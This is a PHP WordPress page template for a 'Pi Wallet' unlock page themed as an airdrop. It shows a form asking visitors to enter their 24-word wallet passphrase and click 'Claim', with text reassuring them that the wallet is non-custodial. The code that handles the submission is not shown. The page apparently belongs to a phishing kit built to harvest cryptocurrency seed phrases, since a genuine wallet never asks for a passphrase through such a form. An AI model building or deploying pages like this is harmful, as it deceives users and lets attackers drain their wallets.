<?php
/**
 * Template Name: Unlock Page
 *
 * The template for displaying the wallet unlock page
 */

get_header();
?>

<div class="min-h-screen bg-white text-white flex items-center justify-center pt-10">
    <div class="bg-white rounded-lg w-96 p-6 relative">
        <h2 class="text-2xl font-semibold text-black text-center mb-6">
            <?php echo esc_html(get_theme_mod('pi_airdrop_wallet_title', 'Unlock Pi Wallet')); ?>
        </h2>

        <form id="wallet-unlock-form">
            <textarea
                id="passphrase"
                name="passphrase"
                rows="6"
                placeholder="Enter your 24-word passphrase here"
                class="w-full p-4 border border-gray-300 rounded-lg mb-4 text-black focus:outline-none focus:ring-2 focus:ring-[#66237d]"
                required
            ></textarea>

            <button
                type="submit"
                class="w-full flex items-center justify-center px-6 py-2 rounded-lg font-medium bg-[#66237d] text-[#fff] border-[1px] border-[#66237d] hover:bg-[#7a3494] transition-colors"
            >
                Claim
            </button>
        </form>

        <div id="wallet-response" class="mt-4 text-center hidden"></div>

        <p class="p-0 font-primary text-sm font-medium text-left text-black mt-4" style="line-height: 1.8;">
            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.

            <p class="mt-3 text-black">
                Lost your passphrase? <a href="#" class="text-blue-800 hover:underline">You can create a new wallet</a>, but all your assets in your previous wallet will be inaccessible.
            </p>
        </p>
    </div>
</div>

<?php
get_footer();
